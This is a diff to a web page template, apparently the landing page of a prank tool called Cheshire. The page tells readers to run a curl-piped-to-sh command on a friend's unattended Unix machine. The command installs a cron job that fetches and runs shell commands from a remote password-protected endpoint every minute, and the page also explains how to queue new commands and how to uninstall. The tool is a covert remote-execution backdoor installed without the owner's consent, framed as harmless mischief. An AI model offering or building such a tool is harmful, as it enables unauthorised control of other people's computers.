@@ -1,5 +1,49 @@
 extends layout
 
 block content
-  h1= title
-  p Welcome to #{title}
+  h1 Cheshire
+  p Welcome to Cheshire, the simplest way to cause some harmless mischief for
+    | your friends who run *nix machines and leave them unattended.
+  p Cheshire provides a one-stop solution for discreet remote access to a
+    | machine, perfect for popping up videos like 
+    a(href="http://www.youtube.com/watch?v=eh7lp9umG2I") this
+    |  or 
+    a(href="http://www.youtube.com/watch?v=LbXiECmCZ94") this
+    |  by installing a cron job that runs on the minute, fetching and executing
+    | shell commands from a unique password-proected endpoint that you have
+    | access to.
+
+  h2 Get Started
+  p When your target leaves their computer unattended, simply pick a unique name
+    | for their box and execute the following command:
+    pre sh<(curl -s #{host}:#{port}/install/[name])
+    | and provide a password. This will set up an endpoint at 
+    code #{host}:#{port}/scripts/[name]
+    |  which will hold your script-lets. By default, it contains
+    pre touch /tmp/cheshire
+    | so if your target is going to be away from their computer on the next
+    | changing of the minute, you can verify that Cheshire was installed
+    | successfully.
+  p Each script-let can only be fetched once (this is enforced server-side), to
+    | prevent the same script from being executed repeatedly. To add a new
+    | script, send a 
+    code PUT
+    |  request (that's right, we use 
+    code PUT
+    | ) to 
+    code #{host}:#{port}/scripts/[name]
+    |  with 
+    code password=[password]
+    |  and 
+    code contents=[script contents]
+    |  as 
+    strong form
+    |  parameters, not query parameters.
+  p When your friend demands that you fix their computer (possibly threatening
+    | you, too), or the novelty has worn off, you can simply execute
+    pre sh <(curl -s #{host}:#{port}/uninstall/name)
+    | Because this removes the endpoint on the server, too, you need the
+    | endpoint password for this.
+
+  h2 Security, Trust, Legal, etc.
+  p There's a lot of issues here. Don't do anything bad.
